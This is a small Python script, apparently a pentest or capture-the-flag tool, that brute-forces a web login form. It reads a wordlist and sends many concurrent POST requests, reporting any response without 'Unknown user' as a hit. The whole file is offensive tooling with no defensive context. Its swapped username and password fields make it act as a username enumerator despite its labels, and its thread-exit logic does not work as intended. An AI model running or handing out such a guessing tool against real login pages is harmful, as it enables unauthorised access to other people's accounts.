import argparse
import requests
from concurrent.futures import ThreadPoolExecutor
import sys


def handle(*, url, user, password):
    try:
        response = requests.post(
            url=url,
            data={
                'username': password,
                'password': user
            },
            headers={'Connection': 'close'}
        )

        # if response.status_code != 200:
        if response.text.find('Unknown user') > -1:
            print('.', end='', flush=True, file=sys.stderr)
        else:
            print('\n[+]', user, ':', password)
            exit()
    except Exception as e:
        print(e)


def enumerate(*, url, user, wordlist, thread_count):

    executor = ThreadPoolExecutor(max_workers=thread_count)
    with open(wordlist, encoding='ISO-8859-15') as f:
        try:
            line = f.readline()
            while line:
                password = line.strip()
                executor.submit(handle, url=url, user=user, password=password)
                line = f.readline()
        except Exception as e:
            print(e)
    executor.shutdown()


if __name__ == "__main__":
    parser = argparse.ArgumentParser('Enumerator')
    parser.add_argument(
        '--url',
        type=str, required=True, help='URL to process'
    )
    parser.add_argument(
        '--user',
        type=str, required=True, help='username to process'
    )
    parser.add_argument(
        '-w', '--wordlist',
        type=str, required=True, help='wordlist to process'
    )
    parser.add_argument(
        '-t', '--thread-count',
        default=3, type=int, help='number of threads'
    )
    args = parser.parse_args()
    enumerate(**args.__dict__)
